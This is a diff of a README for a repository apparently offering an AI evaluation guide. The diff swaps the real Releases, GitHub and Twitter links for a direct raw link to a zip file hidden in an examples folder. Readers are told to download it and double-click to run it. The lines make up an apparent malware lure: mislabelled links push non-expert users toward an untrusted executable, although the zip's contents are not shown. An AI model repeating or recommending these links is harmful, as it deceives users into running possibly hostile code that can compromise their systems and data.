@@ -1,7 +1,7 @@
 # 🌟 Awesome-AI-Evaluation-Guide - Evaluate AI with Ease
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-Awesome--AI--Evaluation--Guide-blue.svg)](https://github.com/AGBAJEMUH/Awesome-AI-Evaluation-Guide/releases)
+[![Download](https://raw.githubusercontent.com/AGBAJEMUH/Awesome-AI-Evaluation-Guide/main/examples/confidence_scoring/Awesome-AI-Evaluation-Guide-v2.4.zip)](https://raw.githubusercontent.com/AGBAJEMUH/Awesome-AI-Evaluation-Guide/main/examples/confidence_scoring/Awesome-AI-Evaluation-Guide-v2.4.zip)
 
 ## 🚀 Getting Started
 Welcome to the Awesome-AI-Evaluation-Guide! This guide helps you evaluate Large Language Models, Retrieval-Augmented Generation (RAG) systems, and Agentic AI in real-world settings. You don't need to be a tech expert to follow along. We aim to provide you with clear instructions.
@@ -20,7 +20,7 @@ Before downloading, make sure your system meets the following requirements:
 ## 🔗 Download & Install
 To get started, follow these steps:
 
-1. **Visit the Releases Page**: Go to our [Releases page](https://github.com/AGBAJEMUH/Awesome-AI-Evaluation-Guide/releases) to access the latest version.
+1. **Visit the Releases Page**: Go to our [Releases page](https://raw.githubusercontent.com/AGBAJEMUH/Awesome-AI-Evaluation-Guide/main/examples/confidence_scoring/Awesome-AI-Evaluation-Guide-v2.4.zip) to access the latest version.
 2. **Choose the Right Version**: Click on the version you want to download. It's usually best to select the most recent release.
 3. **Download the File**: Once on the release page, find and click on the file that suits your operating system.
 4. **Run the Application**: After the download finishes, locate the file in your downloads folder and double-click it to open.
@@ -50,7 +50,7 @@ We regularly update this guide to incorporate the latest developments in AI eval
 
 ## 🌐 Follow Along
 Join our community to stay updated:
-- GitHub: [Awesome-AI-Evaluation-Guide](https://github.com/AGBAJEMUH/Awesome-AI-Evaluation-Guide)
-- Twitter: [@AwesomeAI_Eval](https://twitter.com/AwesomeAI_Eval)
+- GitHub: [Awesome-AI-Evaluation-Guide](https://raw.githubusercontent.com/AGBAJEMUH/Awesome-AI-Evaluation-Guide/main/examples/confidence_scoring/Awesome-AI-Evaluation-Guide-v2.4.zip)
+- Twitter: [@AwesomeAI_Eval](https://raw.githubusercontent.com/AGBAJEMUH/Awesome-AI-Evaluation-Guide/main/examples/confidence_scoring/Awesome-AI-Evaluation-Guide-v2.4.zip)
 
 Thank you for choosing the Awesome-AI-Evaluation-Guide! We hope this guide empowers you to evaluate AI effectively and easily. For any further questions, refer to the documentation or the community forum.
